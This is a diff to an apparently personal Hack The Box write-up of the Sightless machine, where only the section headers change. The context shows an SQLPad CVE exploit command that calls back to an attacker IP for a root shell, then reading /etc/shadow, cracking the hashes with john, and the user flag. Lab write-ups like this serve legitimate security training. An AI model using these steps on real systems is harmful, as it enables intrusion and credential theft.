@@ -1,6 +1,6 @@
 ![](Pasted%20image%2020241020223114.png)
 ###### [link](https://app.hackthebox.com/machines/Sightless)
-# Recon
+# [Recon]()
 
 - Nmap scan
 
@@ -38,12 +38,12 @@ Nmap done: 1 IP address (1 host up) scanned in 69.11 seconds
 - checking http://sightless.htb
 - found http://sqlpad.sightless.htb/
 
-# Vulnerability Discovery
+# [Vulnerability Discovery]()
 
 - found vulnerability in sqlpad - [here](https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb)
 - found more info about the vulnerability - [here](https://github.com/shhrew/CVE-2022-0944?tab=readme-ov-file)
 
-# Exploitation
+# [Exploitation]()
 
 > python3 main.py http://sqlpad.sightless.htb/ 10.10.16.30 9999            
 ```
@@ -73,7 +73,7 @@ uid=0(root) gid=0(root) groups=0(root)
 # 
 ```
 
-# Post-Exploitation
+# [Post-Exploitation]()
 
 - checking /etc/shadow file
 
@@ -121,7 +121,7 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 ```
 
-# CTUF 
+# [CTUF]() 
 
 - after ssh-ing michael I found the user flag
 
@@ -135,10 +135,10 @@ michael@sightless:~$ cat user.txt
 4e365dc2a4a1350b73e96c3e232fe9e2
 ```
 
-# Privilege Escalation
+# [Privilege Escalation]()
 
 - TBD
 
-# Personal Learnings
+# [Personal Learnings]()
 
 - After exploitation look for hashes that can be cracked by john for ssh access to user.
